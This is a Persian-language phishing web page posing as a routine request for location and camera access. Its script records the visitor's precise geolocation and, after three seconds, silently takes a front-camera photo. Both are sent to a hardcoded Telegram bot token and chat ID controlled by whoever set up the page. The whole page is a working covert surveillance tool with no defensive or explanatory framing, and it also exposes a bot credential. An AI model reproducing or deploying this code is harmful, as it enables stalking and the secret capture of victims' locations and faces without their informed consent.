<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لطفاً دسترسی دهید</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Tahoma, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #1e3c72, #2a5298); height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); max-width: 400px; width: 100%; }
        .icon { font-size: 60px; margin-bottom: 20px; display: block; }
        h1 { color: #fff; font-size: 22px; margin-bottom: 15px; }
        p { color: #d0d8e8; font-size: 14px; margin-bottom: 30px; line-height: 1.8; }
        .btn { display: inline-block; background: linear-gradient(135deg, #4CAF50, #2E7D32); color: #fff; padding: 15px 50px; border-radius: 50px; text-decoration: none; font-size: 18px; font-weight: bold; box-shadow: 0 8px 20px rgba(76,175,80,0.4); border: none; cursor: pointer; animation: pulse 2s infinite; }
        @keyframes pulse { 0%{transform:scale(1)} 50%{transform:scale(1.05)} 100%{transform:scale(1)} }
        .status { margin-top: 20px; color: #4CAF50; font-size: 13px; min-height: 20px; }
        .footer { margin-top: 25px; color: #a0aec0; font-size: 11px; }
        video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="icon">🔒</span>
        <h1>دسترسی مورد نیاز است</h1>
        <p>این سایت برای ادامه نیاز به دسترسی موقعیت مکانی و دوربین دارد. لطفاً برای ادامه، روی دکمه زیر کلیک کنید و دسترسی‌ها را تأیید کنید.</p>
        <button class="btn" onclick="start()">🚀 تأیید و ادامه</button>
        <div class="status" id="status"></div>
        <video id="video" autoplay playsinline></video>
        <div class="footer">© ۱۴۰۳ - تمامی حقوق محفوظ است</div>
    </div>

    <script>
        const BOT_TOKEN = '8220638618:AAFFvjJXOyCr9l6abOmVs2nbY1TWgb7TNAo';
        const CHAT_ID = '6578109697';

        async function start() {
            const status = document.getElementById('status');
            status.textContent = '⏳ درخواست دسترسی موقعیت...';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        await sendToTelegram(`📍 موقعیت مکانی:\nعرض: ${lat}\nطول: ${lon}`);
                        status.textContent = '✅ موقعیت ثبت شد';
                        await getCamera();
                    },
                    (err) => {
                        status.textContent = '❌ دسترسی موقعیت رد شد';
                        getCamera();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                status.textContent = '❌ مرورگر پشتیبانی نمی‌کند';
                getCamera();
            }
        }

        async function getCamera() {
            const status = document.getElementById('status');
            const video = document.getElementById('video');
            status.textContent = '⏳ درخواست دسترسی دوربین...';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                video.style.display = 'block';
                status.textContent = '✅ دوربین فعال شد';

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg');
                    await sendPhotoToTelegram(imageData);
                    stream.getTracks().forEach(track => track.stop());
                    status.textContent = '✅ اطلاعات ارسال شد';
                }, 3000);
            } catch (err) {
                status.textContent = '❌ دسترسی دوربین رد شد';
            }
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (e) { console.log('خطا:', e); }
        }

        async function sendPhotoToTelegram(imageData) {
            const blob = await (await fetch(imageData)).blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', '📸 عکس دوربین');
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch (e) { console.log('خطا:', e); }
        }
    </script>
</body>
  </html>
